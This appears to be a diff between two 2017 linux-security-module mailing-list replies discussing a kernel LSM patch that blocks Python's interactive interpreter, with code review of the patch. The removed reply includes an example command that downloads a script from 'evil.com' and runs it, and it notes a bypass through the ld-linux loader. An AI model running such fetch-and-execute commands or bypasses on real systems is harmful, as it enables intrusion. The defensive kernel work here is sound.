@@ -1,26 +1,22 @@
-From: matt@nmatt.com (Matt Brown)
-Date: Fri, 9 Jun 2017 10:50:42 -0400
+From: zohar@linux.vnet.ibm.com (Mimi Zohar)
+Date: Fri, 09 Jun 2017 11:06:06 -0400
 Subject: [PATCH v1] shebang: restrict python interactive prompt/interpreter
 In-Reply-To: <201706092302.HCE57804.OSFJFVtMLOQHFO@I-love.SAKURA.ne.jp>
 References: <1497014528.21594.190.camel@linux.vnet.ibm.com>
 	<201706092302.HCE57804.OSFJFVtMLOQHFO@I-love.SAKURA.ne.jp>
-Message-ID: <bf9f44f5-7b9c-dff1-10e0-84c866c3a372@nmatt.com>
+Message-ID: <1497020766.21594.239.camel@linux.vnet.ibm.com>
 To: linux-security-module@vger.kernel.org
 List-Id: linux-security-module.vger.kernel.org
 
-On 6/9/17 10:02 AM, Tetsuo Handa wrote:
+On Fri, 2017-06-09 at 23:02 +0900, Tetsuo Handa wrote:
 > Mimi Zohar wrote:
->> This patch defines a new, minor LSM named "shebang", that restricts
->> python such that scripts are allowed to execute, while the interactive
->> prompt/interpreter is not available.  When used in conjunction with an
->> IMA appraise execute policy requiring files signatures, only signed
->> python scripts would be allowed to execute.  (A separate method for
->> identifying "imported" code would need to be defined in order to verify
->> their file signatures.)
-
-FYI Mimi posted this because of this current discussion here:
-http://www.openwall.com/lists/kernel-hardening/2017/06/09/13
-
+> > This patch defines a new, minor LSM named "shebang", that restricts
+> > python such that scripts are allowed to execute, while the interactive
+> > prompt/interpreter is not available.  When used in conjunction with an
+> > IMA appraise execute policy requiring files signatures, only signed
+> > python scripts would be allowed to execute.  (A separate method for
+> > identifying "imported" code would need to be defined in order to verify
+> > their file signatures.)
 > 
 > Below case is blocked by IMA?
 > 
@@ -33,25 +29,145 @@ http://www.openwall.com/lists/kernel-hardening/2017/06/09/13
 >    $ chmod +x /tmp/run-python
 >    $ /tmp/run-python
 > 
-
-Does IMA have a way to prevent the following? I think this is the main
-case we are protection against with this LSM.
-
-$ wget www.evil.com/evil.py
-$ /usr/bin/python2 evil.py
-
 > What about execution via ld-linux ?
 > 
 >    $ /lib64/ld-linux-x86-64.so.2 /usr/bin/python2
+
+Assuming that you require file signatures on anything that is
+executed, then only signed binaries, with the public key loaded on to
+the IMA keyring, would be executed.
+
+> > +#define MAX_INODES 6 
+> > +static char *pathnames;
+> > +static int pathnames_len;
+> > +static unsigned long inode_list[MAX_INODES];
+> > +static int total;
+> > +
+> > +/*
+> > + * Get the inodes associated with the list of pathnames, as specified
+> > + * on CONFIG_SECURITY_SHEBANG_PATHNAME.
+> > + */
+> > +static void init_inode_list(void)
+> > +{
+> > +	char *tmp_pathnames = pathnames;
+> > +	char *p;
+> > +	struct path path;
+> > +	int i;
+> > +	int ret;
+> > +
+> > +	total = 0;
+> > +	while ((p = strsep(&tmp_pathnames, " ,")) != NULL) {
+> > +		if ((*p == '\0') || (*p == ' ') || (*p == ','))
+> > +			continue;
+> > +
+> > +		if (total > MAX_INODES - 1) {
+> > +			pr_info("too many interpreters\n");
+> > +			break;
+> > +		}
+> > +
+> > +		ret = kern_path(p, LOOKUP_FOLLOW, &path);
+> > +		if (!ret) {
+> > +			struct inode *inode = d_backing_inode(path.dentry);
+> > +
+> > +			inode_list[total] = inode->i_ino;
+> > +			pr_info("pathname:%s i_ino: %lu\n",
+> > +				p, inode_list[total]);
 > 
+> Leaking reference to "struct path".
 
-Just tested this and you are correct, this allows you to bypass the
-protection.
+kern_path() is calling "getname_kernel(name)", but that is later
+freed. ?I'm not seeing it. ?What are you referring to?
+??
+> > +			initialized = 1;
+> > +			total++;
+> > +		}
+> > +	}
+> > +
+> > +	/* cleanup in case we need to lookup the inodes again. */
+> > +	tmp_pathnames = pathnames;
+> > +	for (i = 0; i < pathnames_len; i++)
+> > +		if (tmp_pathnames[i] == '\0')
+> > +			tmp_pathnames[i] = ' ';
+> 
+> Why need to restore?
 
-I was able to fix this bypass by including /lib64/ld-linux-x86-64.so.2
-in the list of interpreters.
+The patch description just mentions replacing the list of pathnames
+with a set of inodes, but doesn't go into the implications of this
+change. ?When the interpreter package is updated, the list of inodes
+would need to be updated as well.
 
-Matt
+Some method for updating the list of inodes would be needed. ?Probably
+the security_inode_unlink and security_inode_rename hooks would be a
+good place to trigger the inode list update.
+
+> > +}
+> > +
+> > +/**
+> > + * shebang_bprm_check - prevent python interactive prompt/interpreter
+> > + * @bprm: contains the linux_binprm structure
+> > + *
+> > + * Restrict python such that scripts are allowed to execute, while the
+> > + * interactive prompt/interpreter is not available.
+> > + */
+> > +static int shebang_bprm_check(struct linux_binprm *bprm)
+> > +{
+> > +	struct inode *inode = file_inode(bprm->file);
+> > +	int i = 0;
+> > +
+> > +	if (bprm->interp != bprm->filename)	/* allow scripts */
+> > +		return 0;
+> > +
+> > +	if (!initialized)
+> > +		init_inode_list();
+> 
+> init_inode_list() can be called concurrently.
+
+Good catch. ?Thank you.
+
+Mimi
+
+> 
+> > +
+> > +	while (i < total) {
+> > +		if (inode_list[i++] != inode->i_ino)
+> > +			continue;
+> > +
+> > +		pr_info("prevent executing %s (ino=%lu)\n",
+> > +			bprm->interp, inode->i_ino);
+> > +		return -EPERM;
+> > +	}
+> > +	return 0;
+> > +}
+> > +
+> > +static struct security_hook_list shebang_hooks[] = {
+> > +	LSM_HOOK_INIT(bprm_check_security, shebang_bprm_check)
+> > +};
+> > +
+> > +static int __init init_shebang(void)
+> > +{
+> > +	pathnames = kstrdup(CONFIG_SECURITY_SHEBANG_PATHNAME, GFP_KERNEL);
+> > +	if (!pathnames)
+> > +		return -ENOMEM;
+> > +	pathnames_len = strlen(pathnames);
+> 
+> Why need to kstrdup()? 
+> 
+>   static char pathnames[] = CONFIG_SECURITY_SHEBANG_PATHNAME;
+>   static int pathnames_len = sizeof(pathnames) - 1;
+> 
+> will be fine.
+> 
+> > +
+> > +	security_add_hooks(shebang_hooks, ARRAY_SIZE(shebang_hooks), "shebang");
+> > +	pr_info("initialized\n");
+> > +	return 0;
+> > +}
+> > +
+> > +late_initcall(init_shebang);
+> > +MODULE_LICENSE("GPL");
+> 
+> Nice example for loading as a LKM-based LSM. ;-)
+
 --
 To unsubscribe from this list: send the line "unsubscribe linux-security-module" in
 the body of a message to majordomo at vger.kernel.org
